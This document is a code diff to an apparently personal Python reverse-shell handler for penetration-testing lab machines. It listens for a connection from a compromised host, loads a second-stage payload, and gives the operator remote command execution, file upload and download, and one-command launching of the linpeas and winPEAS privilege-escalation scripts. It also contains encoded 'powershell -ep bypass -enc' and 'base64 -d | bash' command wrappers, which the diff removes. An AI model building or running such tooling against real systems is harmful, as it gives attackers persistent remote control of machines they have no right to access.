@@ -2,6 +2,8 @@ import base64
 from hashlib import md5
 import socket
 import sys
+import threading
+import time
 
 from _pyrepl.console import InteractiveColoredConsole
 from _pyrepl.simple_interact import run_multiline_interactive_console
@@ -12,8 +14,11 @@ from _pyrepl.simple_interact import run_multiline_interactive_console
 # mimics what CPython does in pythonrun.c
 
 class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
-    def __init__(self, port=42069):
+    def __init__(self, ip, port=42069):
         super().__init__(filename="REMOTE")
+        self.keep_reading = True
+        self.ip = ip
+        self.port = port
         self.socket = socket.socket()
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.socket.bind(("", port))
@@ -29,16 +34,30 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         self.stdout = self.connection.makefile("rb")
         print("Loading second stage")
         self.run_code_line("&run reverse_shell/reverse_shell_second_stage.py")
+        self.socket_reader = threading.Thread(target=self.reader_thread_function)
+        self.socket_reader.start()
+
+    def reader_thread_function(self):
+        #weird double loop for sleep (eventually)
+        while self.keep_reading:
+            while self.keep_reading:
+                data = self.stdout.readline()
+                if data == b"\x04\n" or data == b"\x04\r\n": break
+                if data.decode(): print(data.decode(), end="\r")
 
     def remote_os_system_call(self,source):
         source = source.replace('"', '\\"')
         return f"os.system(\"\"\"{source[1:]}\"\"\")"
 
-    def remote_powershell_call(self, powershell):
-        return f"powershell.exe -ep bypass -enc {base64.b64encode(powershell.encode("utf-16le")).decode()}"
-
-    def remote_bash_call(self, bash):
-        return f"echo '{base64.b64encode(bash.encode()).decode()}' | base64 -d | bash"
+    def run_shell_script_on_remote(self, file_path):
+        with open(file_path) as f:
+            for i, line in enumerate(f.readlines()):
+                if not line or line == b"\n":
+                    continue # skip empty lines
+                shell_script = line.replace("\\", "\\\\").replace('"', '\\"').replace('\\\\\\"', '\\\\"') # kekw replace sucks
+                shell_script = shell_script.lstrip() # remove spaces because indentation doesnt matter
+                source = f'run_shell_command("""{shell_script}""")'
+                self.runsource(source, None, None)
 
     def special_command(self, source, filename, symbol):
         if source == "exit" or source == "quit":
@@ -67,34 +86,16 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
             with open(local_file) as f:
                 new_source = f.read()
             self.runsource_locally(new_source, filename, symbol)
-        elif source.startswith("exe"):
-            #run local binary on remote
-            pass
-        elif source.startswith("cmd"):
-            # os.system from local file
+        elif source.startswith("shellrun"):
+            #run local file on remote
             _, local_file = source.split(" ")
-            with open(local_file) as f:
-                new_source = f.read()
-            return self.remote_os_system_call(new_source)
-        elif source.startswith("ps"):
-            # powershell from local file
-            _, local_file = source.split(" ")
-            with open(local_file) as f:
-                powershell = f.read()
-            new_source = self.remote_powershell_call(powershell)
-            return self.remote_os_system_call(new_source)
-        elif source.startswith("winpeas"):
-            path = "/usr/share/peass/winpeas/winPEAS.ps1"
-            with open(path) as f:
-                powershell = f.read()
-            new_source = self.remote_powershell_call(powershell)
-            return self.remote_os_system_call(new_source)
+            self.run_shell_script_on_remote(local_file)
         elif source.startswith("linpeas"):
-            path = "/usr/share/peass/linpeas/linpeas.sh"
-            with open(path) as f:
-                bash = f.read()
-            new_source = self.remote_bash_call(bash)
-            return self.remote_os_system_call(new_source)
+            local_file = "/usr/share/peass/linpeas/linpeas.sh"
+            self.run_shell_script_on_remote(local_file)
+        elif source.startswith("winpeas"):
+            local_file = "/usr/share/peass/winpeas/winPEAS.ps1"
+            self.run_shell_script_on_remote(local_file)
 
 
     def upload_file(self, local_file, remote_file):
@@ -146,6 +147,10 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         self.runsource(line, None, None)
 
     def runsource(self, source, filename, symbol):
+        self._runsource(source, filename, symbol)
+
+
+    def _runsource(self, source, filename=None, symbol=None):
         if source.startswith("$"):
             source = self.remote_os_system_call(source)
         elif source.startswith("%"):
@@ -156,14 +161,9 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
             if not source: return
         elif self.might_be_import(source):
             self.runsource_locally(source, filename, symbol)
-
         self.stdin.write(source)
         self.stdin.write("\n\x04\n")
         self.stdin.flush()
-        while self.stdout.peek():
-            data = self.stdout.readline()
-            if data == b"\x04\n" or data == b"\x04\r\n": break
-            print(data.decode().rstrip())
 
     def runsource_locally(self, source, filename, symbol):
         super().runsource(source, filename, symbol)
@@ -186,29 +186,31 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         print("&upload <local> <remote> to upload")
         print("&uploadsliced <local> <remote> to upload in small slices.. this is slow and only for emergencies on offsec trash boxes")
         print("&download <remote> <local> to download")
-        print("&winpeas run winpeas from the local the kali path (/usr/share/peass/)")
-        print("&linpeas run linpeas from the local the kali path (/usr/share/peass/)")
+
         print("&run <file> to run a local python file on remote")
         print("&localrun <file> to run a local python file locally")
-        print("&exe <file> <args> to run a local binary on remote")
-        print("&cmd <file> to run os.system from a local file on remote")
-        print("&ps <file> to run a local powershell file on remote")
+        print("&shellrun <file> to run a local shell file on the remote shell (powershell or bash)")
+        print("&linpeas run linpeas from the default kali path (/usr/share/peass/linpeas/linpeas.sh)")
+        print("&winpeas run winpeas from the default kali path (/usr/share/peass/winpeas/winPEAS.ps1)")
+        print("&interactive drop into an interactive system shell")
         print("=" * 35)
         print("")
 
 
     def kill_remote(self):
         print("Trying to kill remote shell - if this doesnt work it will die eventually from socket errors")
-        self.runsource("import sys\nsys.exit()", None, None)
+        self.runsource("import sys\ninteractive_shell.kill()\nsys.exit()", None, None)
 
-def reverse_shell_handler(local_port):
+def reverse_shell_handler(local_ip, local_port):
     if not hasattr(sys, "ps1"):
         sys.ps1 = ">>> "
     if not hasattr(sys, "ps2"):
         sys.ps2 = "... "
 
-    console = RemoteInteractiveColoredConsole(local_port)
+    console = RemoteInteractiveColoredConsole(local_ip, local_port)
     try:
         run_multiline_interactive_console(console)
     finally:
+        console.keep_reading = False
         console.kill_remote()
+
